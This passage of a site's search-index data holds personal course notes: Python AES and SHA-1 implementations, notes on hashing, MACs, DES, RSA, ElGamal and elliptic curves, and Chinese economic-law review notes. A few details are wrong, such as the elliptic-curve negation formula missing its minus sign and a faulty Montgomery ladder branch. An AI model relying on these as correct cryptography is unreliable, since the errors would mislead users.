0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16, ) InvSbox = ( 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D, ) # learnt from http://cs.ucsb.edu/~koc/cs178/projects/JT/aes.c xtime = lambda a: (((a \u0026lt;\u0026lt; 1) ^ 0x1B) \u0026amp; 0xFF) if (a \u0026amp; 0x80) else (a \u0026lt;\u0026lt; 1) Rcon = ( 0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36, 0x6C, 0xD8, 0xAB, 0x4D, 0x9A, 0x2F, 0x5E, 0xBC, 0x63, 0xC6, 0x97, 0x35, 0x6A, 0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39, ) def text2matrix(text): matrix = [] for i in range(16): byte = (text \u0026gt;\u0026gt; (8 * (15 - i))) \u0026amp; 0xFF if i % 4 == 0: matrix.append([byte]) else: matrix[i / 4].append(byte) return matrix def matrix2text(matrix): text = 0 for i in range(4): for j in range(4): text |= (matrix[i][j] \u0026lt;\u0026lt; (120 - 8 * (4 * i + j))) return text class AES: def __init__(self, master_key): self.change_key(master_key) def change_key(self, master_key): self.round_keys = text2matrix(master_key) # print self.round_keys for i in range(4, 4 * 11): self.round_keys.append([]) if i % 4 == 0: byte = self.round_keys[i - 4][0] \\ ^ Sbox[self.round_keys[i - 1][1]] \\ ^ Rcon[i / 4] self.round_keys[i].append(byte) for j in range(1, 4): byte = self.round_keys[i - 4][j] \\ ^ Sbox[self.round_keys[i - 1][(j + 1) % 4]] self.round_keys[i].append(byte) else: for j in range(4): byte = self.round_keys[i - 4][j] \\ ^ self.round_keys[i - 1][j] self.round_keys[i].append(byte) # print self.round_keys def encrypt(self, plaintext): self.plain_state = text2matrix(plaintext) self.__add_round_key(self.plain_state, self.round_keys[:4]) for i in range(1, 10): self.__round_encrypt(self.plain_state, self.round_keys[4 * i : 4 * (i + 1)]) self.__sub_bytes(self.plain_state) self.__shift_rows(self.plain_state) self.__add_round_key(self.plain_state, self.round_keys[40:]) return matrix2text(self.plain_state) def decrypt(self, ciphertext): self.cipher_state = text2matrix(ciphertext) self.__add_round_key(self.cipher_state, self.round_keys[40:]) self.__inv_shift_rows(self.cipher_state) self.__inv_sub_bytes(self.cipher_state) for i in range(9, 0, -1): self.__round_decrypt(self.cipher_state, self.round_keys[4 * i : 4 * (i + 1)]) self.__add_round_key(self.cipher_state, self.round_keys[:4]) return matrix2text(self.cipher_state) def __add_round_key(self, s, k): for i in range(4): for j in range(4): s[i][j] ^= k[i][j] def __round_encrypt(self, state_matrix, key_matrix): self.__sub_bytes(state_matrix) self.__shift_rows(state_matrix) self.__mix_columns(state_matrix) self.__add_round_key(state_matrix, key_matrix) def __round_decrypt(self, state_matrix, key_matrix): self.__add_round_key(state_matrix, key_matrix) self.__inv_mix_columns(state_matrix) self.__inv_shift_rows(state_matrix) self.__inv_sub_bytes(state_matrix) def __sub_bytes(self, s): for i in range(4): for j in range(4): s[i][j] = Sbox[s[i][j]] def __inv_sub_bytes(self, s): for i in range(4): for j in range(4): s[i][j] = InvSbox[s[i][j]] def __shift_rows(self, s): s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3] def __inv_shift_rows(self, s): s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3] def __mix_single_column(self, a): # please see Sec 4.1.2 in The Design of Rijndael t = a[0] ^ a[1] ^ a[2] ^ a[3] u = a[0] a[0] ^= t ^ xtime(a[0] ^ a[1]) a[1] ^= t ^ xtime(a[1] ^ a[2]) a[2] ^= t ^ xtime(a[2] ^ a[3]) a[3] ^= t ^ xtime(a[3] ^ u) def __mix_columns(self, s): for i in range(4): self.__mix_single_column(s[i]) def __inv_mix_columns(self, s): # see Sec 4.1.3 in The Design of Rijndael for i in range(4): u = xtime(xtime(s[i][0] ^ s[i][2])) v = xtime(xtime(s[i][1] ^ s[i][3])) s[i][0] ^= u s[i][1] ^= v s[i][2] ^= u s[i][3] ^= v self.__mix_columns(s) "},{"id":189,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/4.block-hash-mac/4.2.hashfunctions/","title":"4.2. Hash Functions","section":"4.Block-Hash-MAC","content":"Hash Functions #  Overview #  A hash function h(x) is a map from n bits to m bits where m\u0026lt;n\nAn output of a hash function is called a message digest or a hash value.\nA hash function should satisfy the following property:\n Collision resistance. Second pre-image resistance. Given x, if the probability to find $$y \\not= x $$ such that $$h(y) = h(x)$$ is negligible, then the function h is called second pre-image resistance. Pre-image resistance. Given z, if the probability to find x such that $$z = h(x)$$ is negligible, then the function h is called pre-image resistance.  哈希中的概率计算 #   参考：https://www.cnblogs.com/fengfenggirl/p/hash_prob.html\n 我们假设我们需要将 n 个数字放入大小为 k 的哈希桶中。\n每个桶上项的期望 #  单独对每个项分析，它进入每个桶的概率都是 $$\\displaystyle \\frac{1}{k}$$\n单独对每个桶分析，共有 n 个数字，因此每个桶上项的期望为 $$\\displaystyle \\frac{n}{k}$$\n空桶的期望个数 #  单独对每个桶分析，对于任意一项，该项不落在桶中的概率为 $$\\displaystyle 1 - \\frac{1}{k}$$\n单独对每个桶分析，最后它不为空的概率为 $$\\displaystyle (1 - \\frac{1}{k})^n$$\n所以总共空桶的期望是各个桶为空的期望之和，即空桶的期望个数为 $$\\displaystyle C = k (1 - \\frac{1}{k})^n = k ((1 - \\frac{1}{k})^{-k})^{-\\frac{n}{k}}$$\n而若我们假设 k 足够大（在 Hash 里面，这个数字随比特幂级增长）：$$\\displaystyle C = k (\\lim_{k \\rightarrow \\infin} (1 - \\frac{1}{k})^{-k})^{-\\frac{n}{k}} = ke^{-\\frac{n}{k}}$$\n冲突的期望次数 #  我们知道：$$冲突的期望次数 = n - 最后占用的桶数$$，而 $$最后占用的桶数 = k - 最后空桶的数量$$。\n因此我们知道 $$冲突的期望次数 = n - (k - ke^{-\\frac{n}{k}})$$\n不发生冲突的概率 #  SHA-1 #  Python code github:\n#!/usr/bin/env python from __future__ import print_function import struct import io try: range = xrange except NameError: pass def _left_rotate(n, b): \u0026#34;\u0026#34;\u0026#34;Left rotate a 32-bit integer n by b bits.\u0026#34;\u0026#34;\u0026#34; return ((n \u0026lt;\u0026lt; b) | (n \u0026gt;\u0026gt; (32 - b))) \u0026amp; 0xffffffff def _process_chunk(chunk, h0, h1, h2, h3, h4): \u0026#34;\u0026#34;\u0026#34;Process a chunk of data and return the new digest variables.\u0026#34;\u0026#34;\u0026#34; assert len(chunk) == 64 w = [0] * 80 # Break chunk into sixteen 4-byte big-endian words w[i] for i in range(16): w[i] = struct.unpack(b\u0026#39;\u0026gt;I\u0026#39;, chunk[i * 4:i * 4 + 4])[0] # Extend the sixteen 4-byte words into eighty 4-byte words for i in range(16, 80): w[i] = _left_rotate(w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16], 1) # Initialize hash value for this chunk a = h0 b = h1 c = h2 d = h3 e = h4 for i in range(80): if 0 \u0026lt;= i \u0026lt;= 19: # Use alternative 1 for f from FIPS PB 180-1 to avoid bitwise not f = d ^ (b \u0026amp; (c ^ d)) k = 0x5A827999 elif 20 \u0026lt;= i \u0026lt;= 39: f = b ^ c ^ d k = 0x6ED9EBA1 elif 40 \u0026lt;= i \u0026lt;= 59: f = (b \u0026amp; c) | (b \u0026amp; d) | (c \u0026amp; d) k = 0x8F1BBCDC elif 60 \u0026lt;= i \u0026lt;= 79: f = b ^ c ^ d k = 0xCA62C1D6 a, b, c, d, e = ((_left_rotate(a, 5) + f + e + k + w[i]) \u0026amp; 0xffffffff, a, _left_rotate(b, 30), c, d) # Add this chunk\u0026#39;s hash to result so far h0 = (h0 + a) \u0026amp; 0xffffffff h1 = (h1 + b) \u0026amp; 0xffffffff h2 = (h2 + c) \u0026amp; 0xffffffff h3 = (h3 + d) \u0026amp; 0xffffffff h4 = (h4 + e) \u0026amp; 0xffffffff return h0, h1, h2, h3, h4 class Sha1Hash(object): \u0026#34;\u0026#34;\u0026#34;A class that mimics that hashlib api and implements the SHA-1 algorithm.\u0026#34;\u0026#34;\u0026#34; name = \u0026#39;python-sha1\u0026#39; digest_size = 20 block_size = 64 def __init__(self): # Initial digest variables self._h = ( 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0, ) # bytes object with 0 \u0026lt;= len \u0026lt; 64 used to store the end of the message # if the message length is not congruent to 64 self._unprocessed = b\u0026#39;\u0026#39; # Length in bytes of all data that has been processed so far self._message_byte_length = 0 def update(self, arg): \u0026#34;\u0026#34;\u0026#34;Update the current digest. This may be called repeatedly, even after calling digest or hexdigest. Arguments: arg: bytes, bytearray, or BytesIO object to read from. \u0026#34;\u0026#34;\u0026#34; if isinstance(arg, (bytes, bytearray)): arg = io.BytesIO(arg) # Try to build a chunk out of the unprocessed data, if any chunk = self._unprocessed + arg.read(64 - len(self._unprocessed)) # Read the rest of the data, 64 bytes at a time while len(chunk) == 64: self._h = _process_chunk(chunk, *self._h) self._message_byte_length += 64 chunk = arg.read(64) self._unprocessed = chunk return self def digest(self): \u0026#34;\u0026#34;\u0026#34;Produce the final hash value (big-endian) as a bytes object\u0026#34;\u0026#34;\u0026#34; return b\u0026#39;\u0026#39;.join(struct.pack(b\u0026#39;\u0026gt;I\u0026#39;, h) for h in self._produce_digest()) def hexdigest(self): \u0026#34;\u0026#34;\u0026#34;Produce the final hash value (big-endian) as a hex string\u0026#34;\u0026#34;\u0026#34; return \u0026#39;%08x%08x%08x%08x%08x\u0026#39; % self._produce_digest() def _produce_digest(self): \u0026#34;\u0026#34;\u0026#34;Return finalized digest variables for the data processed so far.\u0026#34;\u0026#34;\u0026#34; # Pre-processing: message = self._unprocessed message_byte_length = self._message_byte_length + len(message) # append the bit \u0026#39;1\u0026#39; to the message message += b\u0026#39;\\x80\u0026#39; # append 0 \u0026lt;= k \u0026lt; 512 bits \u0026#39;0\u0026#39;, so that the resulting message length (in bytes) # is congruent to 56 (mod 64) message += b\u0026#39;\\x00\u0026#39; * ((56 - (message_byte_length + 1) % 64) % 64) # append length of message (before pre-processing), in bits, as 64-bit big-endian integer message_bit_length = message_byte_length * 8 message += struct.pack(b\u0026#39;\u0026gt;Q\u0026#39;, message_bit_length) # Process the final chunk # At this point, the length of the message is either 64 or 128 bytes. h = _process_chunk(message[:64], *self._h) if len(message) == 64: return h return _process_chunk(message[64:], *h) def sha1(data): \u0026#34;\u0026#34;\u0026#34;SHA-1 Hashing Function A custom SHA-1 hashing function implemented entirely in Python. Arguments: data: A bytes or BytesIO object containing the input message to hash. Returns: A hex SHA-1 digest of the input message. \u0026#34;\u0026#34;\u0026#34; return Sha1Hash().update(data).hexdigest() if __name__ == \u0026#39;__main__\u0026#39;: # Imports required for command line parsing. No need for these elsewhere import argparse import sys import os # Parse the incoming arguments parser = argparse.ArgumentParser() parser.add_argument(\u0026#39;input\u0026#39;, nargs=\u0026#39;*\u0026#39;, help=\u0026#39;input file or message to hash\u0026#39;) args = parser.parse_args() data = None if len(args.input) == 0: # No argument given, assume message comes from standard input try: # sys.stdin is opened in text mode, which can change line endings, # leading to incorrect results. Detach fixes this issue, but it\u0026#39;s # new in Python 3.1 data = sys.stdin.detach() except AttributeError: # Linux ans OSX both use \\n line endings, so only windows is a # problem. if sys.platform == \u0026#34;win32\u0026#34;: import msvcrt msvcrt.setmode(sys.stdin.fileno(), os.O_BINARY) data = sys.stdin # Output to console print(\u0026#39;sha1-digest:\u0026#39;, sha1(data)) else: # Loop through arguments list for argument in args.input: if (os.path.isfile(argument)): # An argument is given and it\u0026#39;s a valid file. Read it data = open(argument, \u0026#39;rb\u0026#39;) # Show the final digest print(\u0026#39;sha1-digest:\u0026#39;, sha1(data)) else: print(\u0026#34;Error, could not find \u0026#34; + argument + \u0026#34; file.\u0026#34; ) "},{"id":190,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/4.block-hash-mac/4.3.mac/","title":"4.3. MAC","section":"4.Block-Hash-MAC","content":"MAC #  Overview #  MAC is used for providing authenticity of a user or source originality.\nMethod for generating MAC:\n Pseudo-random sequence generators (or stream cipher). Block ciphers through CBC mode. Keyed hash functions.  "},{"id":191,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/4.block_hash_mac/","title":"4. Block Hash MAC","section":"算法和协议中的安全机制","content":"Chapter 4. Design of Block Ciphers, Hash Functions, and MAC #  Block Cipher #  DES #  DES stand for Data Encryption Standard.\nSpectral properties of S-Box:\n Hadamard transform: $$\\displaystyle f(w) = \\sum_{x \\in F_2^n} (-1)^{f(x) + xw}$$ Avalanche transform: $$\\displaystyle A(w) = \\sum_{x \\in F_2^n} (-1)^{f(x) + f(x + w)}$$  Triple-DES: $$C = E_{K_3} (D_{K_2} (E_{K_1}(M)))$$ or $$C = D_{K_3} (E_{K_2} (D_{K_1}(M)))$$\nEncryption Modes:\n Electronic Codebook (ECB) Mode =\u0026gt; Security risks. Cipher Block Chaining (CBC) Mode.  Montgomery Ladder #  A compute algorithm that resist side-chanel attack.\nfunction f(g, k):\r// g=\u0026gt;number, k=\u0026gt;(k[t-1], ..., k[0])_2\rR0, R1 = 1, g\rfor j in range(t)[::-1]:\rif k[j] == 0:\rR1 = R0*R1, R0 = R0*R0\relse if k[j] == 1:\rR0 = R0*R1, R1 = R0*R0\relse:\rassert False\rreturn R0\rAES #  Stream Cipher \u0026amp; Block Cipher #  Block Cipher: more computationally costly.\nStream Cipher: More desired randomness properties.\nHash Functions #  Why Hash?\n Save Storage Efficient Additional information for integrity check  Hash Standards:\n MD5, Rivest SHA-1 SHA-2 SHA-3 Kecchak  SHA-1 #  IBC(Identity-Based Cryptography) #  Extract:\nThe public key $$Q_i \\in \\mathbb{G}_1^*$$ of node i with identity $$ID_i$$ is as $$Q_i = H_1(ID_i)$$, where ID is an arbitrarily long binary string. The KGC derive\nEncryption \u0026amp; Decryption:\nEncryption:\n  When a user is transmitting a message m to user i confidentially, he encrypts m using user i\u0026rsquo;s public key and the system parameter in the following way: $$Encrypte(m) \\rightarrow C$$\n  When C is computed by:\n Randomly choose $$\\sigma \\in {0, 1}^*$$, and compute $$r =$$    "},{"id":192,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/5.publickey/","title":"5. Public Key","section":"算法和协议中的安全机制","content":"Chapter 5. Public-Key Cryptographic Algorithms #  Security is based on the difficulty of some computational hard problems: factorization large integer, discrete algorithm.\nDiffie-Hellman Key Exchange #  用于在两个终端之间共享一个私密的数字：\n此时两个终端直接就共享了一个私密信息：$$\\displaystyle g^{X_A X_B}\\pmod{p}$$\nRSA #  RSA encrypt algorithm #  RSA digital signature algorithm (RSA-DSA) #  Signed message m:\n  Compute: $$H(m)$$ and $$r = (H(m))^d \\pmod{n}$$\n  r is the digital signature of message m\n  Verify the digital signature r:\n  Compute $$H(m)$$ and $$s = r^e \\pmod{n}$$\n  Check if $$H(m) = s$$\n  ElGamal digital signature #  Digital signature algorithm (ElGamal-DSA) #  在线文档：ElGamal\n见信息安全数学基础中搜集的教程：ElGamal\nHow to attack ElGamal DSA? #  ElGamal DSA is much more complicated than RSA-DSA:\n Forgery if DL is easy. Simply solve y from x using $$y = g^x \\pmod{p}$$ Forgery from attacking PRNG. Forgery from attacking hash function. Directly solve the signing equation: $$H(m) = xr + ks \\pmod{p - 1}$$  Digital signature standard (ElGamal DSS) #  NIST, authentication of electronic documents.\nElliptic curve crypto-system #  Elliptic curve over finite field #  设 $$\\Z_p$$ 为特征大于 3 的素域，在密码学实践中，将 $$E(\\Z_p)$$ 上的 weierstrass 方程定义为：\n $$y^2 = x^3 +ax +b$$ 或者记做 $$y^2 \\equiv x^3 +ax +b \\pmod{p}$$  根据对 Weierstrass 方程的研究，可以导出这个椭圆曲线上的负元公式和加法公式：\n 设 $$P_1 = (x_1, y_1), P_2 = (x_2, y_2)$$ 是 $$E(\\Z_p)$$ 上异于无穷远点 O 的两个点。则： 负元公式：$$-P_1 = (x_1, y_1)$$ 加法公式：考虑 $$P_3 = (x_3, y_3) = P_1 + P_2$$：  可得 $$\\begin{cases} x_3 = k^2 -x_1 - x_2 \\ y_3 = k(x_1 - x_3) - y_1\\end{cases}$$ 其中 $$k = \\begin{cases}\\displaystyle \\frac{y_2 - y_1}{x_2 - x_1} \u0026amp; x_1 \\not= x_2 \\ \\displaystyle \\frac{3x_1^2 + a}{2y_1} \u0026amp; x_1 = x_2\\end{cases}$$    Elliptic curve digital signature algorithm (EC-DSA) #  Identity-Based Cryptography (IBC) #  "},{"id":193,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/6.securityinfrastructure/","title":"6. Security Infrastructure","section":"算法和协议中的安全机制","content":"Chapter 6. Security Infrastructure #  "},{"id":194,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/7.establishcommunication/","title":"7. Establish Communication","section":"算法和协议中的安全机制","content":"Chapter 7. Establish Protect Communications #  "},{"id":195,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BB%8F%E6%B5%8E%E6%B3%95/%E7%BB%8F%E6%B5%8E%E6%B3%95%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/","title":"经济法期末复习","section":"经济法","content":"经济法期末复习 #  .define { color:red; font-weight:bold; }\r.quote { color:blue; font-weight:bold; }\r.question { color:orange; font-weight:bold; }\r.answer { color:SlateGrey; font-weight:bold; }\r.ps {color:grey; opacity:0.6; font-weight:normal; }\r\r第一章 经济法概念 #  第2节 经济法调整对象 #   我国经济法特点：(1)不成熟; (2)缺乏前瞻性; (3)表现为不稳定性。 1992年社会主义市场经济市场经济体制的确定为中国经济法学的发展提供了明确的发展方向 我国经济法调整对象的不同学说：  经济协调学说：经济法是协调经济运行过程中发生的经济关系的法律规范的总称。 干预经济关系法：国家为了克服市场经济调节的盲目性和局限性，而制定的调整 需要由国家干预的具有全局性和社会公共性的经济关系 的法律规范的总称。 国家调节关系说：现代经济法是适应现代市场经济国家调节社会经济的需要而产生并形成独立的法律部门，它是国家调节即“国家之手”有效运作的主要法律保障  国家调节经济运用的三种基本方式：（1）强制；（2）参与；（3）促导   经济管理关系说：经济法是调整发生在政府、政府经济管理机关和经济组织、公民个人之间以社会公共性为根本特征的经济管理关系的法律规范的综合。    第3节 经济法的概念 #   经济法：经济法是为了维护国民经济持续、健康发展，政府依法组织、调节、监督社会经济运行的法律制度的总称  目的主体手段对象维护国民经济持续健康发展政府组织、调节、监督社会经济运行\r.row2of1_3 th { font-weight:normal }\r\r- 理解经济法，应当注意以下的几个问题：\r1. 经济法与经济法律是两个不同的概念。从广义上讲，所有调节经济活动的规则都可以称之为经济法律；但是经济法却是具有特定含义的经济法律制度，更多体现了国民经济宏观运行的要求，其立法宗旨则以国民经济的持续、健康发展为其核心价值目标。\r2. 维护国民经济持续、健康发展是经济法的历史使命。\r3. 政府是经济法的重要主体。政府不仅要监督其他市场主体的经济活动，既要运营国有资产或直接进行生产经营，也要对国名经济运行进行宏观调控。\r- 此外，中介组织包括行业协会作为市场主体，功能介于政府企业之间，也是民法行政法主体内涵难以全面覆盖的。\r4. 关于经济法概念的观点见仁见智。\r第二章 经济法体系 #  第3节 经济法体系的构成 #   基本构成：经济法体系包括两个亚体系：  一是为了保护市场自发调节机制，防止市场失灵的市场规制的法律制度 二是确认和规范政府宏观调控经济运行行为的宏观调控法律制度   经济法体系的内部关系：  二者产生的先后顺序不同。先有微观经济运行→发达混乱→强势介入→宏观调控 二者解决的问题不同。  市场规制法律制度所要解决的问题是，排除干扰自由竞争的因素，保证市场自发调节机制正常运行，防止出现市场失灵； 宏观调控法律制度是确认和规范政府宏观调控经济运行行为，适度干预经济的法律形式。   二者具体构成不同。  市场规制法律制度主要由以下内容组成：竞争法、消费者权益保护法、产品质量法、食品安全法、证券法等； 宏观调控法主要由以下内容构成：财政法、政府采购法、税法、中央银行法、信贷调控法、价格法、对外贸易法等。      第三章 经济法地位 #  第3节 经济法与其他法律部门的关系 #   经济法与民法  民法是最典型的私法，强调个体利益，尊重当事人的意思自治，崇尚契约自由。 经济法给自由放任以适当限制，给权利滥用以法律制约，在自由与干预之间达到平衡，保证社会经济的顺利发展。 此外，经济法通过打击限制竞争与不正当竞争行为，从宏观上引导市场经济健康发展，将民法在市场经济条件下调整经济形成法律空白加以填补，成为市场经济的安全阀。   经济法与行政法  传统意义上，行政法的立法宗旨是，控制行政机关权力膨胀，防止行政权滥用，保护相对人。 现代社会的行政机关被赋予了极大的经济管理权。行政机关的经济管理行为由经济行政法调整。    第四章 经济法原则 #  第1节 经济法原则概述 #   国家适度干预原则是经济法的基本原则  第一编课堂笔记 #  DAY ONE #   人类的基本经济问题：需求无限与资源稀缺之间的矛盾。  DAY TWO #   经济法强调国家适度干预市场：(1)凡是市场能正常运行，不需要干预; (2)若干预市场的行政成本高于市场失灵造成的损失，不实施干预。 国家干预的相对性原则：(1)合适性; (2)必要性; (3)禁止过分性。  既要警惕市场失灵，也要警惕政府失灵   经济法与经济学：(1)经济法表述价值判断; (2)经济学描述客观规律。 经济法的起源：法国（法国空想主义诞生经济法的概念虽无实践意义，但提供的国家干预经济的方向）→德国→日本→苏联→捷克斯洛伐克（第一部经济法法典） 完全市场竞争：形成主要有以下几个条件：  市场上有众多的生产者和消费者，任何一个生产者或消费者都不能影响市场价格； 企业生产的产品具有同质性，不存在差别； 生产者进出市场，不受社会力量的限制； 市场交易活动自由、公开，没有人为限制； 市场信息畅通准确，市场参与者充分了解各种情况（信息完全对称）； 各种资源都能充分流动。   市场失灵：通过市场配置资源不能实现资源最优配置。市场失灵的原因：  垄断; 外部性：正外部性（某个厂商给他人带来的利益→生产厂家缺乏积极性），负外部性（某个厂商损失利益→给社会公共利益造成损失） 公共物品。公共物品有以下特点：(1)不可分割，共同受益，共同消费; (2)非排他性; (3)非竞争性; (4)非营利性。这导致：  生产者、消费者之间无正常联系，投资无积极性，供应不足； 存在免费成份，可不付代价得取得； 私主体难以满足国家要求目标，不能或不愿生产； 信息不对称会导致市场失灵→次品充斥市场 或 道德风险     政府失灵的原因：信息失灵，目标选择失误，管理失控。  DAY THREE #   资本主义时期的经济法产生背景：  (1)克服市场缺陷需要经济法; (2)克服政府失灵需要经济法。 国家职能的四阶段：保护阶段→干预阶段（凯恩斯：国家干预经济；亚当·斯密：自由竞争）→参与阶段（以理想总资本家的身份）→调控阶段。   经济法发展阶段：前资本主义国家经济法→资本主义国家经济法→社会主义经济法 罗斯福新政通过经济立法，标志经济法成为独立法律部门  DAY FOUR #   经济法的基本原则：  基本原则主要包括经济法主体利益协调原则、国家协调本国经济运行法定原则 补充1：经济法社会本位原则; 补充2：促进市场效率原则：(1)维护公平竞争原则; (2)以企业政策促进企业增长; (3)保障市场竞争机制与企业机制协同运行。   经济法体系：包括市场监管法和宏观调控法 经济法是经济发展到一定阶段的必然产物 “政府\u0026ndash;社会中间层\u0026ndash;市场”框架：  市场主体：生产者，投资者，劳动者，消费者 社会中间层主体：独立于政府主体与市场主体，为政府干预市场、市场影响政府和市场主体之间相互联系起中介作用的主体。  社会团体不得以营利为目的 行业协会：为达到行业共同利益的非营利性自发性组织。可以有私法人。 行业协会的自治权是政府监管下的社会权利。权力来源：(1)法律授权; (2)会员的让步（契约产生）; (3)行政授权。     动态社会契约：由于人们对最初社会契约不满而将政府权力让渡。  第五章 政府经济职能法 #  第1节 概述 #   政府与市场的关系主要经历了以下三个方面：  